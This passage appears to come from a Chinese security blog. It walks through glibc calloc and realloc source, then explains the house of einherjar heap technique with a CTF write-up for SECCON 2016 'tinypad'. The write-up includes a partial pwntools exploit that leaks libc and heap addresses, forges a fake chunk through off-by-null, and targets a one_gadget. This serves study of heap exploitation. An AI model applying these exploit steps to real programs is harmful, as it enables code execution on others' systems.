class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memset</span> (mem, <span class="number">0</span>, sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mem;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>不然,chunk置零并返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">  csz = chunksize (p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CLEARS</span></span><br><span class="line">  <span class="keyword">if</span> (perturb_byte == <span class="number">0</span> &amp;&amp; (p == oldtop &amp;&amp; csz &gt; oldtopsize))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* clear only the bytes from non-freshly-sbrked memory */</span></span><br><span class="line">      csz = oldtopsize;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Unroll clear of &lt;= 36 bytes (72 if 8byte sizes).  We know that</span></span><br><span class="line"><span class="comment">     contents have an odd number of INTERNAL_SIZE_T-sized words;</span></span><br><span class="line"><span class="comment">     minimally 3.  */</span></span><br><span class="line">  d = (INTERNAL_SIZE_T *) mem;</span><br><span class="line">  clearsize = csz - SIZE_SZ;</span><br><span class="line">  nclears = clearsize / <span class="keyword">sizeof</span> (INTERNAL_SIZE_T);</span><br><span class="line">  assert (nclears &gt;= <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nclears &gt; <span class="number">9</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memset</span> (d, <span class="number">0</span>, clearsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(d + <span class="number">0</span>) = <span class="number">0</span>;</span><br><span class="line">      *(d + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">      *(d + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (nclears &gt; <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          *(d + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">          *(d + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> (nclears &gt; <span class="number">6</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              *(d + <span class="number">5</span>) = <span class="number">0</span>;</span><br><span class="line">              *(d + <span class="number">6</span>) = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> (nclears &gt; <span class="number">8</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                  *(d + <span class="number">7</span>) = <span class="number">0</span>;</span><br><span class="line">                  *(d + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> mem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>calloc与malloc的核心都是__int_malloc</p><p>而这其实并没有什么太大的差别</p><p>比较大的不同两点:</p><ol><li><strong>calloc会将返回的chunk的mem全部置零</strong></li><li><strong>__libc_calloc函数并不使用tcache</strong></li></ol><h1 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h1><p>原型为void <em> __libc_realloc (void </em>oldmem, size_t bytes)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> REALLOC_ZERO_BYTES_FREES</span></span><br><span class="line">  <span class="keyword">if</span> (bytes == <span class="number">0</span> &amp;&amp; oldmem != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_free (oldmem); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>首先如果bytes为0,且oldmem存在,将其free并返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (oldmem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __libc_malloc (bytes);</span><br></pre></td></tr></table></figure><p>如果oldmem为null,那么改为调用__libc_malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (bytes &lt;= usable)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">size_t</span> difference = usable - bytes;</span><br><span class="line">     <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) difference &lt; <span class="number">2</span> * <span class="keyword">sizeof</span> (INTERNAL_SIZE_T)</span><br><span class="line">  || (chunk_is_mmapped (oldp) &amp;&amp; difference &lt;= GLRO (dl_pagesize)))</span><br><span class="line"><span class="keyword">return</span> oldmem;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>如果申请大小小于已使用大小,且差距小于2*size_t直接返回旧oldmem</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_MREMAP</span></span><br><span class="line">      newp = mremap_chunk (oldp, nb);</span><br><span class="line">      <span class="keyword">if</span> (newp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *newmem = chunk2mem_tag (newp);</span><br><span class="line">  <span class="comment">/* Give the new block a different tag.  This helps to ensure</span></span><br><span class="line"><span class="comment">     that stale handles to the previous mapping are not</span></span><br><span class="line"><span class="comment">     reused.  There&#x27;s a performance hit for both us and the</span></span><br><span class="line"><span class="comment">     caller for doing this, so we might want to</span></span><br><span class="line"><span class="comment">     reconsider.  */</span></span><br><span class="line">  <span class="keyword">return</span> tag_new_usable (newmem);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Note the extra SIZE_SZ overhead. */</span></span><br><span class="line">      <span class="keyword">if</span> (oldsize - SIZE_SZ &gt;= nb)</span><br><span class="line">        <span class="keyword">return</span> oldmem;                         <span class="comment">/* do nothing */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Must alloc, copy, free. */</span></span><br><span class="line">      newmem = __libc_malloc (bytes);</span><br><span class="line">      <span class="keyword">if</span> (newmem == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;              <span class="comment">/* propagate failure */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">memcpy</span> (newmem, oldmem, oldsize - CHUNK_HDR_SZ);</span><br><span class="line">      munmap_chunk (oldp);</span><br><span class="line">      <span class="keyword">return</span> newmem;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>原先的chunk是mmap分配的</p><p>newmem使用__libc_malloc分配,并使用memcpy函数将oldmem中的数据转移到newmem</p><p>并munmap原先的chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">  &#123;</span><br><span class="line">    newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line">    assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">     ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> newp;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">__libc_lock_lock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line"></span><br><span class="line">__libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">        ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (newp == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Try harder to allocate memory in other arenas.  */</span></span><br><span class="line">    LIBC_PROBE (memory_realloc_retry, <span class="number">2</span>, bytes, oldmem);</span><br><span class="line">    newp = __libc_malloc (bytes);</span><br><span class="line">    <span class="keyword">if</span> (newp != <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line"> <span class="type">size_t</span> sz = memsize (oldp);</span><br><span class="line"> <span class="built_in">memcpy</span> (newp, oldmem, sz);</span><br><span class="line"> (<span class="type">void</span>) tag_region (chunk2mem (oldp), sz);</span><br><span class="line">        _int_free (ar_ptr, oldp, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> newp;</span><br></pre></td></tr></table></figure><p>如果以上条件都不满足</p><p>则调用_int_realloc函数进行分配</p><p>至于_int_realloc的函数暂时不做分析</p><h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>realloc在ctf中出现较少</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> calloc </tag>
            
            <tag> realloc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how2heap</title>
      <link href="/posts/49295/"/>
      <url>/posts/49295/</url>
      
        <content type="html"><![CDATA[<h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（<strong>合并低地址的 chunk</strong>），从而使得尽可能避免碎片化。</p><p><strong>利用条件:</strong>off-by-one(可写下一chunk的prev_size与prev_inuse位)</p><p><strong>利用效果:</strong>得到一个几乎可以指向任何位置的chunk(要本身可写可控)</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>free函数向低地址chunk合并的操作如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>假设在内存由低到高有A与B两个chunk</p><p>且A能够改写B的prev_size与prev_inuse位</p><p><strong>unlink的chunk地址由以下代码决定</strong></p><p><code>p = chunk_at_offset(p, -((long) prevsize));</code></p><p>因为prevsize(<strong>有符号数</strong>)也是可控的</p><p>因此只需要在目标地址伪造fakechunk绕过unlink的检查即可</p><p><strong>完整性检查</strong>:难以找到存储&amp;A的内存,故选择fakechunk-&gt;fd=fakechunk-&gt;bk=fakechunk</p><p><strong>size检查:</strong>通过fakechunk的size字段找到的nextchunk的prev_size字段是否等于fakechunk的size</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/backward_consolidate.png" alt=""></p><p>这样最后就能在unsortedbin中放入一个任意位置的chunk</p><p>不过这个chunk的size大概率无法通过unsorted取出时的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                   chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p>因此还需要再次写这个chunk的size为一个合适且合法的值</p><h2 id="2-29新限制"><a href="#2-29新限制" class="headerlink" title="2.29新限制"></a>2.29新限制</h2><p>2.29向低地址合并操作代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现多了一个检测(通过prevsize找到的chunk的size<strong>?=</strong>prevsize)</p><p>这就使得fakechunk的size必须和prevsize相同,而这样的话fakechunk的nextchunk必然还是原本的chunk,这样常常会使得fakechunk的size过大,从而被视作largebin进而会多出一些操作</p><p>因此,2.29及以后fakechunk的size字段必须和本chunk的prevsize相同</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><strong>2016 Seccon tinypad</strong></p><p>保护pie没开</p><p>漏洞有off_by_null</p><p>个人第一想法其实是:没开pie且数据段上存放指针—-&gt;可以打unlink</p><p>写hook执行system(‘/bin/sh’)或onegadget</p><p>exp都快写好了,才发现一个致命的点———-写的时候长度是由strlen定的,malloc_hook默认是null,也就是说就算指向了malloc_hook也写不了</p><p>于是只能学习ctfwiki的做法了(其实如果按以上想法做根本就没用到house of einherjar的知识)</p><p>思路如下:</p><p>常规泄露heap地址,libc地址;并以此得到heap与tinypad的偏移,environ的符号地址,one_gadget等等</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Deleted.&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">heap_addr=u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x120</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">tinypad=<span class="number">0x602040</span></span><br><span class="line">prev_size=heap_addr-<span class="number">0x602040</span></span><br><span class="line">environ=libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">one_gadget=libc.address+<span class="number">0x45226</span></span><br></pre></td></tr></table></figure><p>先申请四个chunk</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x11</span>))<span class="comment">#!!!</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure><p>其中chunk2之所以要在尾部写p64(0x11))</p><p>是因为chunk2将用以free触发unlink,其后又会检测chunk2下一chunk的prev_inuse状态,写p64(0x11))用于off_by_null将chunk2的size改为0x100后继续维持后续chunk正常被寻找</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>+p64(prev_size))</span><br><span class="line">fakechunk=<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(tinypad+<span class="number">0x20</span>)*<span class="number">2</span>+p64(<span class="number">0x20</span>)<span class="comment">#!!!</span></span><br><span class="line">edit(<span class="number">3</span>,fakechunk)</span><br></pre></td></tr></table></figure><p>释放chunk1再重新分配以off_by_null写chunk2的size和prev_size</p><p>并将fakechunk写在tinypad上,注意绕过unlink检查(自己做的时候这里犯了个蠢,fake_size用偏移offset填充,使得通过size找到的chunk为chunk2,这样是能够绕过部分检查,但offset的大小使得chunk被视作largebin从而unlink多了一部分检查nextsize链,而我又没填充nextsize域)</p><p><code>delete(2)</code>删除chunk2触发unlink使得tinypad被联入unsortedbin</p><p>此时fakechunk的大小显然不合规</p><p>于是</p><p><code>edit(4,b&#39;4&#39;*0x20+p64(0)+p64(0x101)+p64(libc.symbols[&#39;__malloc_hook&#39;]+0x10+0x58)*2)</code></p><p>将fakechunk的size改为能适中的大小</p><p>之后<code>add(0xf0,b&#39;2&#39;*0xd0+p64(666)+p64(environ)+b&#39;a&#39;*8+p64(0x602148))</code>将其申请出来并写memo1和memo2的指针</p><p>以此写main的返回地址</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.binary=<span class="string">&#x27;./tinypad&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./tinypad&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./tinypad&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(content)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">p.sendline(<span class="string">b&#x27;Q&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Deleted.&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">heap_addr=u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x120</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">tinypad=<span class="number">0x602040</span></span><br><span class="line">prev_size=heap_addr-<span class="number">0x602040</span></span><br><span class="line">environ=libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">one_gadget=libc.address+<span class="number">0x45226</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x11</span>))<span class="comment">#!!!</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>+p64(prev_size))</span><br><span class="line">fakechunk=<span class="string">b&#x27;3&#x27;</span>*<span 